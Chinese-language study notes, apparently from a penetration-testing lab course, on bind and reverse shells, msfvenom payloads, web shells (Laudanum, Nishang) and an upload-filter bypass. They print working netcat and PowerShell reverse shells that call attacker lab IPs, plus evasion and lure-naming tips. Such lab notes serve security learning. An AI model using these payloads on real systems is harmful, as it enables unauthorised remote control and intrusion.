一、背景介绍
当通过分析枚举相应的漏洞并且进行漏洞等利用后 ，需要通过建立shell的方式 或者反弹shell的方式来建立反向链接 以保证攻击方能够正常的与该机器时刻保持交互 
这就是shell模块
允许我们提权 旋转 传输文件等操作的运行 
命令行访问通常不是图形化界面 ，这样更容易操作并且难以发现
通过如下操作来 观察:
1 computing                                就是shell的命令行模块 powershell等 可以在pc端利用 管理任务提交指令

2shell 利用漏洞 或者安全措施访问 
3 webshell  是利用了上传文件或者脚本来访问 


payload ：
1) networking 数据包封装数据部分
2) basic computing  操作系统指令集（不包含标头跟协议信息）
3) programming  编程语言的部分
4) exlpiittation 跟security  这个利用计算机系统上漏洞
此主要是建立与受害者机器的长期会话联系（用netcat等工具建立的联系）

shell 的组成 
1 terminal emulator（终端模拟器）
模拟终端进行操作 ，以达到未来能跟系统文件等交互的需求 

2 os（操作系统）
3 command language interpreter 这个是程序命令解释界面
解释用户的指令并发送给操作系统   主要可以想象成 vscode的 编辑器部分   翻译 “ls 等代码语言 来给操作系统解释一下这个干嘛的”
命令语言解释器指的是与用户交互的部分 就是咱们的 
![[Pasted image 20240309183025.png]]
把人录进去的话翻译成机器能听得懂得语言的部分
二 小技巧
1 输入 ps 查看linux中的正在运行的进程：
2 输入env 查看linux 中此时正在使用的shell语言 

注：终端模拟器语言可以自定义shell 不局限于一种形式

英语的of 前缀  我的阅读理解啊  啊啊啊啊啊a

通过利用bindshell 跟reserve shell 尝试跟攻击的机器进行交互的一个过程 
当通过bind 监听的时候 考虑问题如下：
1 必须有一个在目标上启动的侦听器
2 通常管理员会设置nat规则来防范这一点  所以我们需要进入内网后就可避免这汇总情况

原理是：攻击方---->受害者      通过nc监听这种举动 
其中细节命令解释 

目标机器中的
nc -lvnp 7777
其中nc 是netcat的缩写 -l 是侦听传入链接 （别人发给他的信息 属于接收方需要有个人当发出方 千万不可两端口同时侦听传入链接）
-v 是展示详细信息  
-n是不对任何端口等进行查找  这样 7777被解释为端口号 
防止被对方发现  的一种操作形式 
-p是指定端口号 
同时 注意 在目标机器上执行：
（1）nc -lvnp  此操作经试验 仅需提供端口号即可
具体-l是侦听谁传入给她链接  同时-v展示详情信息 来判断是否接入成功 -n不对任何端口进行查找防止泄露信息 -p是指定在7777端口号上面进行连接操作 
（2）nc -nv ip地址  端口号
没有了l 跟p 就是向这个ip地址跟端口号发送请求  
总结：一个发送一个接受 万万不可是俩接收

目标端口上的执行 的值
接收方目标端口的值

![[Pasted image 20240309192229.png]]


攻击方端口的值
![[Pasted image 20240309192153.png]]

小结：上述操作仅仅是为了建立tcp链接 模拟聊天进行即使通信传输的过程 并未与操作系统跟shell进行交互

二 使用nc建立交互shell
目的：建立一个交互性的bashshell 的反弹端口  从目的地址客户端 连接到攻击方 的地址 让我们能在攻击方使用到这个
命令执行 
target  ：
rm -rf /tmp/f ; mkdir /tmp/f; cat/tmp/f | /bin/bash -i 2>&1|nc -l 10.129.119.185 7654 >/tmp/f
具体翻译如下：
1 存储在/tmp文件下的通常是临时文件，这样做可以防止该命令永久保存导致信息泄露容易被对方溯源 
2 rm -rf 删除原有/tmp/f文件下的所有已经保存的信息 后
重新创建一个文件夹 /tmp/f 后进入到该目录内 
3 在这个目录中输出一条 建立/bin/bash客户端的脚本 同时-i提供了 交互 让我们与bash脚本可以产生交互系统、
同时在 2>&1 2 提供了是错误信息  就是将bash链接过程中的错误信息输出到输出端 ，让我们可以看见及时反馈的错误信息 
&  让操作系统 误认为是进程编号而不是一个名称 


插入：
1) stdin 代表文件描述符0  表示标准输入 
 默认状态下是从用户中读取输入的地方，当在终端中输入命令的时候 通过stdin输入给正在运行程序
 2) stdout 文件描述符1 默认下 stdout 输出结果地方 会显示在终端中
3) stderr 文件描述符2 这个是将报错信息进行输出的地方 
| nc -l 等待接受输入消息 ip地址是本机ip 开放本机ip地址 的xxx端口进行等待对方输入链接过来 > 进行重定向到输入到/tmp/f这个文件中

注意：此权限 可在用户态跟核心态下均可执行


REverse  shell
反向链接设立的目的 ：
 管理员可能忽视出站链接 ，可能会忽视从受害者机器到攻击机的方式， 这是一个反向shell的备忘单，如果忘记的时候 可以通过此进行操作
 https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md


当想侦听到目标的地址时候   在攻击者的kali等某些攻击机上进行：sudo nc -lvnp 443技术  侦听443端口的信息 后 
攻击机作为服务器 ， 443端口  443作为一个公共端口，通常用443端口
1 为什么要用443  而不用别端口？
因为443管理的时候 是 启用https服务，这个通常是组织进行正常业务往来的时候通常会采用的端口号443 所以不会阻止443的流量
注：在第七层waf 进行数据包检测  可以检测公共端口的出站的反向shell  不止是ip地址跟端口还有的是waf的规则，这涉及到waf的规避防范技术


2 在window启用 shell命令进行尝试搭建简单的tcp链接 链接涉及到的ip地址是 攻击方的ip地址 正所谓反向的意思就是这个 
在受害者端链接到攻击方 

具体payload的代码如下：
```
$client = New-Object System.Net.Sockets.TCPClient('10.10.14.158',443);
$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%{0};
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
    $sendback = (iex $data 2>&1 | Out-String );
    $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
    $stream.Write($sendbyte,0,$sendbyte.Length);
    $stream.Flush();
};
$client.Close()
```
具体逐行解析：
```
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.158',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"

```
逐行解析为下：
1powershell -nop -c  命令行参数 
-nop 是以无控制台输出  静默输出方式进行
-c是单行命令 就不用分段编写了
并且告诉可以直接用cmd.exe执行
2 "$client = New-Object System.Net.Sockets.TCPclient('10.10.14.158,443')"
$client创建了=cmdlet的变量 new-object   其中这个cmdlet代指的是创建新的对象实例 允许通过指定的对象类型跟属性来创建对象
创建了tcp客户端对象链接到 ip地址的地方 主机端
3 "$stream = $client.GetStream();"这个获取了tcp客户端关联的网络流 
引入了关于getstream 的$clients的相关方法内容    这个方法具体是“
https://learn.microsoft.com/en-us/dotnet/api/system.net.sockets.tcpclient.getstream?view=net-5.0
4“[byte[]]$bytes = 0..65535|%{0};”初始化字节数组 保存网络流中读取的数据
创建一个空字节用来存放byte的65535的字节信息 设置存放字节为0-65535的信息  以用来存放 tcp侦听器
5开启循环 ，循环持续执行，直到读取数据长度是0 
6网络流读取字节数据转换为ascii编码
7$sendback =(iex $data 2>&1 | out-string ); 执行是字符串执行命令并且捕获其输出 并且让其结果转换为字符串
8$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';  这个是 将其pwd 命令指的死幻将当期那目录链接起立
9$stream.Write($sendbyte ,0 $sendbyte.length);"


netcat的一些例子
1 ：```shell-session
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc 10.10.14.12 7777 > /tmp/f                        
```

一些具体的例子
```
分句解析:
1 rm -f /tmp/f：删除/tmp/f文件 并且-f 选项导致忽略不存在的文件
2 mkfifo 制作一个 新的/tmp/f 管道文件
其中什么是mkfifo呢？
fifo：命名管道  其目的是作为文件系统的一部分进行访问 ，打开的时候通过多个进程进行读取写入工鞥，想内核传递数据并且不需要写入文件系统重
文件系统当做目录进行访问 
3 cat /tmp/f 打开这个管道命名的文件，后并且连接到 
4/bin/bash -i 2>&1 |  打开/bin/bash 系统 -i确保 有交互 2>&1确保所有的标准错误数据 到标准输出数据都传输到 |后面命令 ，可以看到交互是否发生的同时了解到错误信息是什么 
5 nc 10.10.14.22 7777 在受害者段进行开启7777端口 并且 链接到攻击机 的7777端口中，并且输出重定向到 /tmp/777内容中  

总体思路:
有几个要点 
(1) ：为什么放到tmp目录下原因如下：tmp目录中所有文件都有写的权限，这样放便把攻击的脚本写进去  2 tmp中是linux 存储临时文件的地方，这样做可以保证操作的安全性等问题，第三个 /tmp有普遍性 
 (2):为什么用mkfifo进行呢？答：1 因为mkfifo管道创建保证了不会被截胡，采取两头通信直达系统内核并且可以调用ipc通信 /bin/bash控制台 
 mkfifo 是持久化 在进行重启后依旧可以存在 的同时并且允许双向通信
 (3)为什么用mkfifo 不用mkdir呢？
 因为 mkdir 是创建文件不是进行进程通信创建能力，mkfifo采用特殊机制进行 

metasploit 的一些细节
1 smb  psexec 模块
 psexec 是 一个 横向移动的工具 攻击者可以利用psexec来执行 一些远程代码工作：具体细节：
 https://www.silverfort.com/glossary/psexec/#what-is-psexec-used-for
 2psexec 与powershell 的区别 ：
 psexec 仅仅是单个的命令行执行工具，无法向powershell 的一样执行多种任务 ，算是初级与目标任务点的工具
 3psexec 与smb之间有这密不可分的联系 是 横向移动的一把手
 4 当出现smb等服务的时候需要首先想到对方是否机器上安装了psexec 等工具
5利用完对应模块后 ，在window 初步建立shell后 进行交互提升 可以使用 shell 来将window的交互提升到一个全新的等级
在window上注意拿到powershell互动后去user里面看看

常规利用  shell 进行工作  


二 当对方无网络的时候 或者 有限制的时候 可以通过msfvenom制作有效负载一起发送到对方 上面 进行社工手段
1 在命令太输入  msfvenom -l payloads 后可以列出所有可用的payload s 
然后 进行 查看
![[Pasted image 20240424213741.png]]
当进行查看完毕后，观察到有连个 staged 跟 stageless  

分阶段（staged）：可以搭建舞台进行的一个   操作 当链接的时候 
我们需要设置 一些操作后受害者机器 回弹一个shell 利用成功后进行 提权等 狗仔运行的shell操作 ，即可，可以通过shellcode进行连接 并且进行利用
比如第一阶段是 tcp客户端 第二段反弹等等 


跟无阶段（stageless） :
这个更为隐蔽  直接一次性发送全部 但是容易不稳定
更详细分析请阅读：
https://www.rapid7.com/blog/post/2015/03/25/stageless-meterpreter-payloads/

构造无阶段有效的负载 ：
命令如下:
`msfvenom -p linux/x64/shell_reverse_tcp LHOST=本地的主机 LPORT =本地开放的端口 -f elf>看起来很容易被点击的名字.elf`
各种部分解释如下：
1 -p 表明这个msfvenom正在创建有效的负载
2 linux 。。。根据架构选择的有效负载 tcp的反向shell
3 lhost 的地址 链接回弹 也就是攻击者的地址
4 -f elf 是 生成一个二进制的文件格式 这个是elf
5 >xxx.elf生成一个 喜欢的名字的elf文件

### laudanum  构造webshell 
这个软件的目的： 注入反向webshell搞事情
存放位置：1kali 中自带位置是/usr/share/laudanum
非kali中需要访问 ：https://github.com/jbarcia/Web-Shells/tree/master/laudanum 
可以得到对应的webshell操作
使用方法 ：
1准备工作：在/etc/hosts上面添加 <目的ip地址> 虚拟主机  在这个实验中是 ：status.inlanefreight.local
2 进行复制文本后进行修改 后代码 然后 修改内部细节 比如 ip地址  反弹 到本机的IP地址等行为 


###工具二 ：nishang
github地址：
https://learn.microsoft.com/en-us/aspnet/overview 要攻击的原理 
工具地址
https://github.com/samratashok/nishang

kali地址：在/usr/share/nishang/antk/antkshell.aspx这个模块下

进入后 修改凭证：![[Pasted image 20240504121904.png]]
在if 那一栏 username  等 修改为自己的自定义凭证 ，为了防止别人用 
然后
浏览器端输入之前的虚拟主机 ：
![[Pasted image 20240504122155.png]]
后进入 ：
下方传入  文件 后 url输入![[Pasted image 20240504122232.png]]
提示路径  在浏览器url将此路径补全即可完成渗透
当作为红队的时候记得把注释删掉！！！！
## phpshell
访问网址 ：发现是 rconfig服务 ，
该服务常常是管理员管理网络的一个平台（主营网络设备）
尝试登录账号密码是 admin  登录成功 
在 该界面初次尝试登录抓包失败，
后修改 后缀 用burp抓包后改后缀名 
抓包到burp观察 发现报文中这一条 ：
![[Pasted image 20240505103712.png]]
accept 允许这个 后缀名中，唯独没有php后缀  
故观察得到 image/* 任何带有这个的后缀名均可通过 所以 尝试修改为/image/gif
所以  改为了：
![[Pasted image 20240505103827.png]]
![[Pasted image 20240505103907.png]]
确定后  在拦截状态开启的时候  在 proxy的栏目中 进行修改细节  (可以先在repreter 实验 观察是否 报错等问题后再)点击forward 两次后将其发到后台  
可以观察到 ：
